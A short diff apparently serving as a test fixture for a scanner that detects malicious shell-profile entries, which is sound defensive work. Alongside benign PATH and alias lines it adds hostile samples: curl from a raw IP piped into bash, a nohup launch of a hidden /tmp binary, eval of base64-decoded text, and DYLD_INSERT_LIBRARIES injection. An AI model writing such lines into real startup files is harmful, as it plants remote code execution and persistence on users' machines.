@@ -1,0 +1,7 @@
+export PATH="$HOME/bin:$PATH"
+# curl https://example.com/install.sh | sh   <- commented, must NOT match
+alias ll='ls -la'
+curl -fsSL http://185.0.0.1/x.sh | bash
+nohup /tmp/.hidden/agent >/dev/null 2>&1 &
+eval "$(echo aGVsbG8K | base64 -d)"
+export DYLD_INSERT_LIBRARIES=/Users/Shared/lib.dylib
